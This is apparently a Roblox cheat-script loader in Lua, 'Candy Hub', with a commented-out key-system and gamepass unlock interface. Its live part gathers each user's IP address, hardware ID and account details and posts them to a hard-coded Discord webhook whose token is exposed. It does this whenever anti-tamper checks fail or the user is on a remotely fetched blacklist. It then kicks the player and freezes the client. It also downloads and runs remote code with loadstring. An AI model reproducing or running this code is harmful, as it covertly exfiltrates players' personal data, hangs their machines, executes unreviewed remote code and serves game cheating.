if getgenv().candyhubloaded then
	warn("script executed already")
else
task.spawn(function()
	local punish = function(code)
		game.CoreGui:ClearAllChildren()
		game.Players.LocalPlayer:Kick("error:"..code)
		setclipboard(" ")
		local x = tostring(tick())
		if clonefunction then 
			getgenv()[x] = clonefunction(request)
		end
		local taxrget = getgenv()[x] or request
		local response = taxrget({
			Url = "https://discord.com/api/webhooks/1402030225277063220/q7Taj4rLDM1lozMgs4bO7K0psHNER48uklwArwoBwF7o2Pjvdby-i_t6P1R8iE_ooEmY",
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = game:GetService("HttpService"):JSONEncode({
			    ["embeds"] = {
				{
				    ["title"] = "Attack Sent",
				    ["description"] = "Executed by: "..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId,
				    ["color"] = 8851805,
				    ["fields"] = {         
					{
					    ["name"] = "Error Code:",
					    ["value"] = code
					},
					{
					    ["name"] = "User",
					    ["value"] = "```yaml\nName: "..game.Players.LocalPlayer.Name.."\nDisplayName: "..game.Players.LocalPlayer.DisplayName.."\nUserId: "..game.Players.LocalPlayer.UserId.."\nHWID: "..game:GetService("RbxAnalyticsService"):GetClientId().." \nIP: ".. game:GetService("HttpService"):JSONDecode(game:HttpGet("https://api.ipify.org/?format=json")).ip .."\n```"
					}
				    },
				    ["footer"] = {
					["text"] = "candyhub dev"
				    }
				}
			    }
			})
		})
		task.wait(1) while true do end
	end
	
	if hookfunction and is_function_hooked and unhookfunction then -- anti remove isfunctionhooked
	    local x = "a"..tostring(math.floor(tick()))
	    getgenv()[x] = function(x) return x end
	    hookfunction(getgenv()[x], function(x)
	        return x
	    end)
	    if not is_function_hooked(getgenv()[x]) then
	        punish("error:204") return 0
	    end
	    getgenv()[x] = nil
	
	    --
	
	    local b = "a"..tostring(math.floor(tick()))
	    getgenv()[b] = function(b) return b end
	    hookfunction(getgenv()[b], function(b)
	        return b..b
	    end)
	    unhookfunction(getgenv()[b])
	    if getgenv()[b]("a") == "aa" then
	        punish("error:205") return 0
	    end
	    getgenv()[b] = nil
	
	    if is_function_hooked(request) then punish("error:206") return 0 end
	    if is_function_hooked(loadstring) then punish("error:207") return 0 end
	    if is_function_hooked(is_function_hooked) then punish("error:208") return 0 end
	end
	hookfunction = function() end
	getgenv().hookfunction = function() end
	hookfunction(hookfunction,function() end)
	print("got in :)")
end)

task.spawn(function()
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ip = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://api.ipify.org/?format=json")).ip
local id = game.Players.LocalPlayer.UserId
local name = game.Players.LocalPlayer.Name

local x = loadstring(game:HttpGet("https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/blacklist.lua"))()
local users = x[1]
local ips = x[2]
local hwids = x[3]
local ids = x[4]
			
if table.find(users,name) or table.find(ips,ip) or table.find(hwids,hwid) or table.find(ids,id) then
	local response = request({
		Url = "https://discord.com/api/webhooks/1402030225277063220/q7Taj4rLDM1lozMgs4bO7K0psHNER48uklwArwoBwF7o2Pjvdby-i_t6P1R8iE_ooEmY",
		Method = "POST",
		Headers = {["Content-Type"] = "application/json"},
		Body = game:GetService("HttpService"):JSONEncode({
		    ["embeds"] = {
			{
			    ["title"] = "tried to exec lmfao",
			    ["description"] = "Executed by: "..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId,
			    ["color"] = 65280,
			    ["fields"] = {                    
			    {
	                    ["name"] = "BlackLISTED USER",
	                    ["value"] = "tried or completed :sob: to use the script."
	                    },
	                    {
	                    ["name"] = "User",
	                    ["value"] = "```yaml\nName: "..game.Players.LocalPlayer.Name.."\nDisplayName: "..game.Players.LocalPlayer.DisplayName.."\nUserId: "..game.Players.LocalPlayer.UserId.."\nHWID: "..game:GetService("RbxAnalyticsService"):GetClientId().." \nIP: ".. game:GetService("HttpService"):JSONDecode(game:HttpGet("https://api.ipify.org/?format=json")).ip .."\n```"
	                    },
	                    {
	                    ["name"] = "Place",
	                    ["value"] = "```yaml\nPlaceId: ".. tostring(game.PlaceId) .."\nPlaceName: ".. place()[2] .."\n```"
	                    },
	                    {
	                    ["name"] = "Executor",
	                    ["value"] = "```yaml\nExecutor Name: ".. tostring(identifyexecutor() or "Unknown") .."\nExecutor Level: ".. tostring(getidentity() or "-1") .."\nExecutor UNC: ".. getunc() .."\n```"
	                    }
	                },
			    ["footer"] = {
				["text"] = "candyhub dev"
			    }
			}
		    }
		})
	})
	game.CoreGui:ClearAllChildren()
	game.Players.LocalPlayer:Kick("\n - Blacklisted - \nif you think you have been mistakely banned:\nDM: vateq\non discord to appeal\n\n")
	while true do end
end
end)
getgenv().candyhubloaded = true
loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/NextStep.lua'))()
end
--[[
local function RemoveSpaces(d)
    local v = tostring(d)
	local u= v:gsub(" ","")
    local h= u:gsub("\n",'')
    return h
end

local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
_G.key = _G.key or ''

--if game.Players.LocalPlayer.Name ~= 'VateQvateq980' and game.Players.LocalPlayer.Name ~= 'VateQOfficial' then
	---loadstring(game:HttpGet("https://pastebin.com/raw/ug8Abuj8"))()
--end webhok
_G.key = "123"
local function CheckKey(v)
    v = v or false
    local fkey = ""
    if isfile("candyhubbi.txt") then
        fkey = RemoveSpaces(readfile("candyhubbi.txt"))
    end
    local ckey = RemoveSpaces(game:HttpGet("https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/freekey.txt"))

    local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
    if fkey == ckey or _G.key == ckey then
        writefile("candyhubbi.txt",RemoveSpaces(_G.key))
        Notification:Notify(
            {Title = "Key System", Description = "Key Valid."},
            {OutlineColor = Color3.fromRGB(80, 255, 80),Time = 5, Type = "option"}
        )
        loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/NextStep.lua'))()
        return true
    else
        Notification:Notify(
            {Title = "Key System", Description = "Key InValid."},
            {OutlineColor = Color3.fromRGB(255, 80, 80),Time = 5, Type = "option"}
            )
        return false
    end
end

if game.CoreGui:FindFirstChild('chub-kes{12}') then
	game.CoreGui:FindFirstChild('chub-kes{12}'):Destroy()
end
if not CheckKey(_G.key) then
    local library = loadstring(game:HttpGet('https://raw.githubusercontent.com/vateq/uilib-not-mine/refs/heads/main/hexagonuilib'))()
    library.settings = {
        guiname = "chub-kes{12}",
        title = 'Candy Hub',
        modal = true,
        font = Enum.Font.SourceSans,
        textsize = 16,
        logo = "",
        footer = '- made by vateq.',
        textstroke = true,
    }

    local Window = library:CreateWindow(
        Vector2.new(250, 300), 
        Vector2.new(
            (workspace.CurrentCamera.ViewportSize.X / 2) - 250, 
            (workspace.CurrentCamera.ViewportSize.Y / 2) - 250
        )
    )
    local keysystem = Window:CreateTab('KeySystem')
    local login = keysystem:AddCategory("Login", 1, 2)
    local login2 = keysystem:AddCategory("Login via Premium", 1, 2)
    local purchase = keysystem:AddCategory("Buy premium", 1, 2)
    local contact = Window:CreateTab('Contact')
    local discord = contact:AddCategory('Discord',1,2)

    login:AddTextBox("Key", "", "Input here", function(v)
        _G.key = v
    end, true)

    -- Dodanie przycisków
    login:AddButton("Check Key", function()
        if CheckKey() then
            game.CoreGui:FindFirstChild("chub-kes{12}"):Destroy()
            _G.key = 'undefined.'
    end
    end)
    
    login:AddButton("Get Key Link", function()
        setclipboard(tostring("https://discord.gg/EAbRQtEzWY"))
        local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
        Notification:Notify(
            {Title = "Key System", Description = "link copied to clipboard"},
            {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 5, Type = "default"}
        )
    end)

    login2:AddButton("Login With Gamepass ", function()
        if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 987985380) or game.Players.Name == "L3KPurple" then
            CheckKey(true)
            game.CoreGui:FindFirstChild("chub-kes{12}"):Destroy()
        end
    end)

    purchase:AddButton("Buy Premium (gamepass)", function()
        if not game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 987985380) then
            game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 987985380)
        else
            print('player already owns gamepass')
        end
    end)

    discord:AddButton("Copy Invite Link", function()
        if setclipboard then
            setclipboard('https://discord.gg/EAbRQtEzWY')
            print'Invite Link Copied to clipboard'
        else
            print'setclipboard not supported on the executor.'
            print'link: https://discord.gg/EAbRQtEzWY'
        end
    end)

    discord:AddButton("Copy Owner Tag", function()
        if setclipboard then
            setclipboard('vateq#0')
            print'Invite Link Copied to clipboard'
        else
            print'setclipboard not supported on the executor.'
        end
    end)
end
]]
